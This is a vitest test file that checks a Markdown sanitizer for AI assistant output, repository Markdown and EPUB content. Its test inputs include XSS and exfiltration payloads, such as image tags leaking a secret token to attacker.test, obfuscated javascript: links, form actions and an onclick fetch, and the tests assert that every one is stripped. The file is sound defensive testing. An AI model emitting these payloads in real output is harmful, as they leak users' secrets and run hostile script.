import { describe, expect, it } from "vitest";
import { assistantMarkdownToRichPlainText, renderAssistantMarkdownHtml } from "@/assistant/chatArtifacts";
import { isApprovedRepositoryAssetPath, renderEpubMarkdownHtml, renderRepositoryMarkdownHtml } from "@/markdown/safeMarkdown";

describe("assistant Markdown security boundary", () => {
  it("preserves safe Markdown formatting and safe links", () => {
    const html = renderAssistantMarkdownHtml("## Heading\n\n**bold** and [docs](https://example.test/docs)\n\n- one\n- two");
    expect(html).toContain("<h2>Heading</h2>");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain('href="https://example.test/docs"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(html).toContain("<ul>");
  });

  it.each([
    '<img src="https://attacker.test/x?secret=TOKEN">',
    '<img srcset="https://attacker.test/a 1x, https://attacker.test/b 2x">',
    '<svg><image href="https://attacker.test/svg"></image></svg>',
    '<math><mtext><img src="https://attacker.test/math"></mtext></math>',
    '<form action="https://attacker.test/post"><input name="secret"></form>',
    '<div style="background:url(https://attacker.test/css)">styled</div>',
    '<video poster="https://attacker.test/poster"><source src="https://attacker.test/v"></video>',
    '[image](javascript:alert(1))',
    '<a href="java&#x73;cript:alert(1)">bad</a>',
    '<a href="jav\nascript:alert(1)">bad</a>',
    '<iframe srcdoc="<img src=https://attacker.test/frame>"></iframe>',
    '![remote](https://attacker.test/markdown.png)',
  ])("blocks XSS or resource exfiltration in rendered and formatted-copy content: %s", (payload) => {
    const html = renderAssistantMarkdownHtml(payload);
    const plain = assistantMarkdownToRichPlainText(payload);
    expect(html).not.toMatch(/<(?:img|svg|math|form|input|video|source|iframe)\b/i);
    expect(html).not.toMatch(/(?:src|srcset|style|action|poster)\s*=/i);
    expect(html).not.toMatch(/javascript\s*:/i);
    expect(html).not.toContain("attacker.test");
    expect(plain).not.toContain("attacker.test");
  });

  it("removes event handlers and malformed protocol links while keeping their text", () => {
    const html = renderAssistantMarkdownHtml('<p onclick="fetch(`https://attacker.test`)"><a href="\u0000javascript:alert(1)">keep me</a></p>');
    expect(html).toBe("<p><a>keep me</a></p>");
  });

  it("applies the same resource-blocking boundary to repository Markdown", () => {
    const html = renderRepositoryMarkdownHtml('<img src="https://attacker.test/leak"><p onclick="alert(1)">safe text</p><a href="javascript:alert(1)">link</a>');
    expect(html).toContain("<p>safe text</p>");
    expect(html).toContain("<a>link</a>");
    expect(html).not.toContain("attacker.test");
    expect(html).not.toContain("onclick");
  });

  it("allows only repository-relative asset paths", () => {
    expect(isApprovedRepositoryAssetPath("assets/cover.png")).toBe(true);
    expect(isApprovedRepositoryAssetPath("../assets/cover.png")).toBe(true);
    for (const path of ["https://attacker.test/a.png", "//attacker.test/a.png", "data:image/png;base64,AA", "blob:https://app.test/id", "javascript:alert(1)"]) {
      expect(isApprovedRepositoryAssetPath(path)).toBe(false);
    }
  });

  it("sanitizes EPUB Markdown and retains only packaged links and images", () => {
    const html = renderEpubMarkdownHtml([
      "**safe**",
      '<script>alert(1)</script><p onclick="alert(1)">text</p>',
      "![local](images/cover.png)",
      "![remote](https://attacker.test/leak.png)",
      "[chapter](chapter-2.xhtml)",
      "[external](https://attacker.test/)",
    ].join("\n\n"), new Set(["images/cover.png", "chapter-2.xhtml"]));
    expect(html).toContain("<strong>safe</strong>");
    expect(html).toContain('src="images/cover.png"');
    expect(html).toContain('href="chapter-2.xhtml"');
    expect(html).not.toMatch(/script|onclick|attacker\.test/i);
  });
});
